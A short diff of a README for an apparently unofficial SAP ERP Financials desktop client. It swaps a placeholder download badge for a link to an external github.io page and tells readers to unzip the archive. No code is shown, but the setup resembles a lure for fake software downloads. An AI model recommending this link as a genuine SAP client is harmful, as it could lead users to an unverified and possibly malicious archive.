@@ -6,7 +6,7 @@ This unofficial SAP ERP Financials desktop client delivers core enterprise accou
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://sap-erp-financials-desktop.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
